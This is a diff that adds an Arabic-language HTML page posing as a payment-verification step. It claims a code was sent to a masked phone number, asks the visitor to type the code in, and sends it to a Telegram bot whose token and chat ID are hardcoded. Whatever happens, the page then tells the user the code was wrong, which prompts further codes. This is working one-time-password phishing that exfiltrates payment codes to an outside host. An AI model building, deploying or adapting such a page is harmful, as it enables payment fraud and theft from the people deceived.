@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة إرسال</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body, html {
+            height: 100%;
+            font-family: Arial, sans-serif;
+        }
+
+        /* تصميم الصفحة بالكامل */
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+        }
+
+        /* تصميم البوكس */
+        .box {
+            background-color: #fff;
+            padding: 2rem;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .box h2 {
+            margin-bottom: 1.5rem;
+            color: #333;
+        }
+
+        /* تصميم الإدخال */
+        .box input[type="text"] {
+            width: 100%;
+            padding: 0.75rem;
+            margin-bottom: 1.5rem;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 1rem;
+        }
+
+        /* تصميم الزر */
+        .box button {
+            width: 100%;
+            padding: 0.75rem;
+            background-color: #28a745;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            cursor: pointer;
+        }
+
+        .box button:hover {
+            background-color: #218838;
+        }
+
+        /* استجابة الموبايل */
+        @media (max-width: 600px) {
+            .box {
+                padding: 1rem;
+                max-width: 90%;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="box">
+            <h1>التحقق من الدفعة</h1>
+            <br>
+            <br>
+            <h2>05 **** ***** تم ارسال رمز التحقق الى </h2>
+            <input type="text" id="userMessage" required placeholder="أدخل رمز التحقق هنا">
+            <button id="sendBtn">إرسال</button>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('sendBtn').addEventListener('click', function() {
+            var userMessage = document.getElementById('userMessage').value;
+
+            if (userMessage) {
+                // معلومات بوت Telegram
+                var telegramToken = '7789845398:AAEHKJDnUFpcG6bn_6lgCqZuygOyxaA-ElY'; // ضع توكن البوت هنا
+                var telegramChatId = '-1002324684325'; // ضع معرف الدردشة هنا
+
+                // إرسال الرسالة إلى Telegram باستخدام API
+                fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: telegramChatId,
+                        text: `كود التحقق: ${userMessage}`
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("خطأ في رمز التحقق حاول مرة اخرى");
+                        // يمكنك تحويل المستخدم إلى صفحة أخرى بعد نجاح الإرسال إذا أردت
+                        // window.location.href = "success.html";
+                    } else {
+                        alert("حدث خطأ أثناء إرسال الرسالة.");
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert("حدث خطأ أثناء إرسال الرسالة.");
+                });
+            } else {
+                alert("يرجى إدخال رسالة.");
+            }
+        });
+    </script>
+
+</body>
+</html>
